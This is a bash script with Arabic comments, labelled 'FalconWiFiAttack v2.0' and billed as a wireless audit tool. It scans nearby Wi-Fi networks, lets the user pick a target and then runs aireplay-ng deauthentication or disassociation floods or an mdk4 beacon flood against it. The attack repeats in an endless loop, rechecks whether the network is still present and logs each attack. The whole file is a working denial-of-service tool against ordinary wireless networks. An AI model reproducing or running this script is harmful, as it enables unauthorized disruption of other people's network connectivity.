#!/bin/bash

# ========= إعدادات أساسية ==========
interface="wlan0"
mon_iface="${interface}mon"
scan_duration=15
sleep_if_hidden=60
log_file="falcon_log.txt"

# ========= تفعيل Monitor Mode ==========
setup_monitor() {
    echo "[*] تفعيل وضع المراقبة..."
    airmon-ng start $interface > /dev/null 2>&1
}

# ========= البحث عن الشبكات ==========
scan_networks() {
    echo "[*] مسح الشبكات لمدة $scan_duration ثانية..."
    timeout ${scan_duration}s airodump-ng --band abg --write /tmp/falconscan --output-format csv $mon_iface > /dev/null 2>&1
    awk -F',' '/WPA|WEP|OPN/ && $14 != "" {print $1","$4","$14}' /tmp/falconscan-01.csv | sort -u
}

# ========= اختيار الهدف ==========
select_target() {
    local networks="$1"
    declare -A netmap
    echo -e "\n📡 الشبكات المتاحة:"
    i=1
    while IFS=',' read -r bssid channel ssid; do
        echo "[$i] SSID: $ssid | BSSID: $bssid | CH: $channel"
        netmap[$i]="$bssid|$channel|$ssid"
        ((i++))
    done <<< "$networks"
    read -p "🔢 اختر رقم الشبكة المستهدفة: " choice
    echo "${netmap[$choice]}"
}

# ========= اختيار نوع الهجوم ==========
select_attack_mode() {
    echo -e "\n🛠️ اختر نوع الهجوم:"
    echo "[1] Deauth"
    echo "[2] Disassociation"
    echo "[3] Beacon Flood (mdk4)"
    read -p "⚔️ النوع: " attack_type
    echo $attack_type
}

# ========= تنفيذ الهجوم ==========
execute_attack() {
    case $1 in
        1) aireplay-ng --deauth 50 -a "$bssid" $mon_iface > /dev/null ;;
        2) aireplay-ng --disassociate 50 -a "$bssid" $mon_iface > /dev/null ;;
        3)
            if command -v mdk4 > /dev/null; then
                echo "$ssid" > /tmp/fake_beacon.txt
                mdk4 $mon_iface b -f /tmp/fake_beacon.txt > /dev/null
            else
                echo "❌ mdk4 غير مثبت"
            fi
            ;;
        *) echo "❌ نوع الهجوم غير مدعوم" ;;
    esac
}

# ========= التحقق من الشبكة ==========
check_presence() {
    timeout 7s airodump-ng --essid "$ssid" --output-format csv --write /tmp/recheck -c $channel $mon_iface > /dev/null 2>&1
    grep "$ssid" /tmp/recheck-01.csv
}

# ========= البداية ==========
clear
echo "🦅 FalconWiFiAttack v2.0 — Advanced Wireless Audit Tool"

setup_monitor
networks=$(scan_networks)

if [[ -z "$networks" ]]; then
    echo "❌ لا توجد شبكات متاحة!"
    airmon-ng stop $mon_iface
    exit 1
fi

selected=$(select_target "$networks")
IFS='|' read -r bssid channel ssid <<< "$selected"
attack_mode=$(select_attack_mode)

echo "[+] تم تحديد الهدف: $ssid | $bssid | Channel $channel"
echo "[+] نوع الهجوم: $attack_mode"

# ========= التكرار الذكي للهجوم ==========
while true; do
    echo "[*] التحقق من وجود الشبكة $ssid ..."
    presence=$(check_presence)

    if [[ -z "$presence" ]]; then
        echo "🟡 الشبكة اختفت! الانتظار $sleep_if_hidden ثانية..."
        echo "$(date '+%H:%M:%S') - $ssid اختفت" >> $log_file
        sleep $sleep_if_hidden
    else
        echo "⚔️ تنفيذ الهجوم الآن..."
        execute_attack $attack_mode
        echo "$(date '+%H:%M:%S') - هجوم تم على $ssid" >> $log_file
        sleep 5
    fi

    # تنظيف
    rm -f /tmp/recheck-01.csv /tmp/fake_beacon.txt
done
